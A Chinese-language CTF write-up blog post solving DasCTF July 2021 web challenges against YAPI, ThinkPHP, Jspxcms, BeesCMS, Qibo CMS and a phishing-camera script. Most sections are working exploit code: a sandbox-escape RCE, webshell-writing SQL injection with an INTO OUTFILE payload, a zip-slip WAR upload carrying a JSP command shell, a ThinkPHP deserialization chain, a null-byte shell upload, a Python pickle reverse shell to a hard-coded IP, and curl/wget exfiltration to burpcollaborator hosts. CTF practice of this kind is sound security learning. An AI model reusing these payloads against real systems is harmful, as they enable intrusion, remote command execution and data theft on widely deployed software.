---
title: "DasCTF0721 Wp"
slug: "dasctf0721-wp"
description: "不菜的，就是有点菜；只有web题 别的不会"
date: 2021-08-05T23:15:47+08:00
categories: ["CTF"]
series: []
tags: ["wp", "participate"]
draft: false
toc: true
---

## cat flag

> 简简单单cat flag
>
> Hint: 管理员曾访问过flag

```php
<?php

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match('/flag/i',$cmd))
    {
        $cmd = escapeshellarg($cmd);
        system('cat ' . $cmd);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

提示管理员访问过，先`cat /var/log/nginx/access.log`

![image-20210802142131657](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png)

之后用`%fa`绕过 `/?cmd=this_is_final_fl%faag_e2a457126032b42d.php`

review - **Nginx 重要文件目录：**

- 配置文件存放目录：/etc/nginx
- 主要配置文件：/etc/nginx/conf/nginx.conf
- 管理脚本：/usr/lib64/systemd/system/nginx.service
- 模块：/usr/lisb64/nginx/modules
- 应用程序：/usr/sbin/nginx
- 程序默认存放位置：/usr/share/nginx/html
- 日志默认存放位置：/var/log/nginx/access.log

## ezrce

> 你真的会 nodejs 吗？

是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：[Yapi 存在远程命令执行漏洞](https://blog.csdn.net/XavierDarkness/article/details/118662886)

那就好办了 跟着来就行咯；首先创建一个项目

![image-20210731153231688](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png)

之后修改全局mock脚本

```js
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockjson = process.mainModule.require("child_process").execSync("command").toString()
```

之后添加接口

![image-20210731154705721](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png)

脚本中的execSync()处可rce，先用`wget http://xxxxx.burpcollaborator.net`试试水

![image-20210731154732738](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png)

很顺利嘛 好耶！

```bash
cat `ls`	// spawnSync /bin/sh ENOBUFS
cat `cd ../;ls`	// config.json, init.lock, log, vendors
cat `cd ../../;ls`	// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
cd ../../;cat `ls`	// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat `cd ../../;cat ffffffflllllaggggg`	// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b}
```

## easythinkphp

> easythinkphp

只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：[【漏洞通报】ThinkPHP3.2.x RCE漏洞通报](https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ)

```
/index.php?m=--><?=phpinfo();?>
/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
```

![image-20210801011103992](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png)

先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马

```
/index.php?m=--><?=eval($_POST['wuhu']);?>
```

传入后 用蚁剑连接就能拿flag了~

![image-20210801012307515](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png)

或者也可以直接使用[ThinkphpGUI](https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2)一把梭！一键getshell 你值得拥有

![image-20210803170035307](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png)

## jspxcms

也有现成的洞可以直接用，参考：[复现jspxcms解压getshell漏洞](https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/)  |  [代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540)](https://www.shengchulai.com/blog-NJwAv8oZV1.htm)  |  [记一次由追踪溯源发现的“不安全解压getshell”](https://www.anquanke.com/post/id/188788)

首先构造含jsp🐎的恶意war包，🐎长这样

```jsp
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("wuhu")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成

```python
import zipfile

if __name__ == "__main__":
    try:
        binary = b'<script>alert("helloworld")</script>'
        zipFile = zipfile.ZipFile("test123.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test123.zip")
        zipFile.writestr("../../../../dog123.html", binary)
        zipFile.close()
    except IOError as e:
        raise e
```

```python
import zipfile
z = zipfile.ZipFile('test123.zip', 'a', zipfile.ZIP_DEFLATED)
with open('wuhu.war', 'rb')as f:
    temp = f.read()
z.writestr('../../../../wuhu.war', temp)
z.close()
```

需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署

![image-20210801013622428](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png)

直接`cat /flag`就好啦

## cybercms

> 赛博CMS，只为安全而生
>
> Hint：信息搜集是一个web手必备的技能

一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错

![image-20210801031306740](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png)

在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西

![image-20210801031809386](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png)

如何设置进站语言这篇里竟然是这样的![image-20210801032406665](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png)

草 真是蚌埠住了 图穷匕见了属于是2333333

根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：[Beescms_v4.0 sql注入漏洞分析](https://www.cnblogs.com/yuzly/p/11423384.html)

在admin后加单引号，提示![image-20210801113627407](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png)

表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段

简单fuzz可知：过滤了空格（用`/**/`绕过）（或者用`tab`绕过 或者`%0a`绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）

```
user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
```

![image-20210801121138555](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png)

回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）

```
admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
```

![image-20210801121645243](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png)

好耶，连蚁剑拿flag咯

![image-20210801121853464](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png)

## ez_website

> 简单的题目

也是现实世界存在的东西，参考：[齐博建站系统x1.0代码审计](https://ma4ter.cn/2527.html)

直接用已有的链子打

```php
<?php
namespace think\process\pipes {
    class Windows {
        private $files = [];

        public function __construct($files)
        {
            $this->files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
        }
    }
}

namespace think {
    abstract class Model{
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        {
            $this->parent = $output;  //$this->parent=> think\console\Output;
            $this->append = array("xxx"=>"getError");     //调用getError 返回this->error
            $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
        function __construct($output, $modelRelation)
        {
            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\model\relation{
    class HasOne extends OneToOne {

    }
}
namespace think\model\relation {
    abstract class OneToOne
    {
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        {
            $this->selfRelation = 0;
            $this->query = $query;    //$query指向Query
            $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        }
    }
}

namespace think\db {
    class Query {
        protected $model;

        function __construct($model)
        {
            $this->model = $model; //$this->model=> think\console\Output;
        }
    }
}
namespace think\console{
    class Output{
        private $handle;
        protected $styles;
        function __construct($handle)
        {
            $this->styles = ['getAttr'];
            $this->handle =$handle; //$handle->think\session\driver\Memcached
        }

    }
}
namespace think\session\driver {
    class Memcached
    {
        protected $handler;

        function __construct($handle)
        {
            $this->handler = $handle; //$handle->think\cache\driver\File
        }
    }
}

namespace think\cache\driver {
    class File
    {
        protected $options=null;
        protected $tag;

        function __construct(){
            $this->options=[
                'expire' => 3600,
                'cache_subdir' => false,
                'prefix' => '',
                'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php',
                'data_compress' => false,
            ];
            $this->tag = 'xxx';
        }

    }
}

namespace {
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
    echo urlencode(serialize($window));

}
```

上传

```
/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
```

虽然会返回一个报错的页面，但是可以在`/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php`处验证一下是否写上了🐎，文件名字是`md5('tag_'.md5($this->tag))`，连接密码是ccc 直接蚁剑

![image-20210804202819779](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png)

在[雪殇的wp](http://www.snowywar.top/?p=2424)中用的是另一个，更直接的写🐎方式，下面说一下思路（大概

我们可以先尝试看看敏感函数file_put_contents()是否能利用

![image-20210804212231467](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png)

在`application/admin/controller/Upgrade.php`下看到了文件写入的函数，它位于在`writelog()`中，这个函数的功能是处理post请求传入的各项参数

![image-20210804212743633](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png)

这个`config('client_upgrade_edition')`捏，跟了一下  它会返回null，再往上看到`_initialize()`

![image-20210805140607537](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png)

所以最后是会将$upgrade_edition写入中`/runtime/client_upgrade_edtion.php`中；而整个writelog()函数会被sysup()调用

![image-20210804213858768](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png)

跟进这个sysup()和$upgrade_edtion，看是否可用+如何用

![image-20210804220616726](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png)

在`template/admin_style/default/admin/upgrade/index.htm`下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看

![image-20210804214721944](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png)

![image-20210804215658734](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png)

抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎

```
/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
```

![image-20210804220302331](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png)

将🐎写进的目标页面`/runtime/client_upgrade_edition.php`连入蚁剑 拿flag即可

————比赛的时候我其实是没有搜到[齐博建站系统x1.0代码审计](https://ma4ter.cn/2527.html)这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过

## 安全,安全,还是xxx的安全

> 某个特别安全的商店
>
> Hint:
>
> ```sql
> CREATE TABLE "users" (
>   "id" INTEGER NOT NULL,
>   "username" TEXT UNIQUE ,
>   "login_password" text,
>   "money" INTEGER,
>   "pay_password" TEXT,
>   "flag_num" INTEGER,
>   PRIMARY KEY ("id")
> );
>
>
> CREATE TABLE "flaaaaaaaaag" (
>   "flllllllag" TEXT
> );
> ```

特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli![image-20210801133701306](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png)

任意注册账号，走一波流程

![image-20210801133748445](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png)

![image-20210801133808970](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png)

![image-20210801133825487](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png)

~~😅蚌埠住了~~

回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码

![image-20210805142343684](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png)

注册时用post提交信息，密码部分用的是`md5(app.users.password+'CBCTF')`，支付密码是`encrsa(app.users.pay_password)`，好家伙 这个加密 pay_password部分md5+rsa+b64......

————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考[wp](https://www.cnblogs.com/erR0Ratao/p/15088223.html)之后的复现

赛后讲题的时候 出题师傅说参考的是这一篇文章[数据加密或成WAF失效最大元凶…](http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&p=8734d15e8cd012a05abd9b7d0c1093&newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&s=cfcd208495d565ef&user=baidu&fm=sc&query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&qid=e0c153e70004188f&p1=1)（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段

![image-20210805151726564](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png)

这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果

公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭

![image-20210805153732476](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png)

重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag

![image-20210805152706585](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png)

## jj's camera

> jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点
>
> Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应

也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：[在吗宝贝？你点开这个网址看看[打开网站偷拍照片]](https://www.heibai.org/post/2002.html)  |  [点开一个网址我被记录了ip还偷拍了照片](https://www.heibai.org/post/1630.html)

（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。

前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx&url=xxx，这是qbl.php的源码

```php
<?php
error_reporting(0);
$base64_img = trim($_POST['img']);
$id = trim($_GET['id']);
$url = trim($_GET['url']);
$up_dir = './img/';//存放在当前目录的img文件夹下
if(empty($id) || empty($url) || empty($base64_img)){
    exit;
}
if(!file_exists($up_dir)){
  mkdir($up_dir,0777);
}
if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)){
  $type = $result[2];
  if(in_array($type,array('bmp','png'))){
    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
    header("Location: ".$url);
  }
}
?>
```

file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了

```
/qbl.php?id=wuhu.php%00a&url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
```

参考：[wp](https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/)

## easyweb

有一个docker的附件和一些源码

![image-20210805160437216](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png)

首页就是个白底黑字的Hello World，审下源码

![image-20210805160540313](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png)

![image-20210805160627110](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png)

直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: `"justMyCode": false`这样可以在调用堆栈处看到完整的调用情况

![image-20210805180835775](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png)

可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦

payload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法

```python
class A:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/175.24.73.30/2333 0>&1"'
        s="__import__('os').popen('{}').read()".format(cmd)
        return (eval,(s,))  #reduce必须返回元组或字符串

def hello_world(request):
    request.session["233"] = "2333"
    request.session["a"] = A()
    return Response('Hello World!')
```

构造请求的话还是老朋友~~ burp collaborator~~

```bash
curl "xxxxxx.burpcollaborator.net/`readflag`"
```

参考：[wp](http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf)

## easyjava

java 根本不会

放个参考链接 溜了：[wp1](https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501)  [wp2](https://ha1c9on.top/2021/08/02/dasctf-2021-07/)

------

最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）

争取早收工吧，还有upload, xss, csrf, sqli......等着总结 还有超级多东西要学要看

学习好耶！σ`∀´)
